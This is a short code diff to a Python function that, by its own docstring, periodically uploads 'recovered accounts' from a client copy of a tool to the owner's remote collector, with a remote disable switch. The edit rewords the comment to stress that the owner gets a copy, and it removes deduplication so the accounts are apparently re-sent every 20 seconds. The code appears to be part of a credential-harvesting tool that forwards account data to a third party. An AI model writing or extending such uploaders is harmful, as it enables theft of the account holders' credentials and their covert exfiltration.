@@ -1126,10 +1126,10 @@ def api_clients_download(cid):
 
 
 def client_uploader_loop():
-    """CLIENT edition: periodically upload recovered accounts to the owner's
-    collector and honor the remote disable switch."""
+    """CLIENT edition: periodically upload a COPY of the recovered accounts to
+    the owner's collector AND honor the remote disable switch. The client keeps
+    its own local recovered_accounts.txt; the owner just receives a copy."""
     import urllib.request
-    last_sent = None
     while True:
         try:
             time.sleep(20)
@@ -1155,7 +1155,6 @@ def client_uploader_loop():
                     pass
             else:
                 client_status["disabled"] = False
-                last_sent = content
         except Exception:
             # Network hiccup - keep trying; do not disable on transient errors
             pass
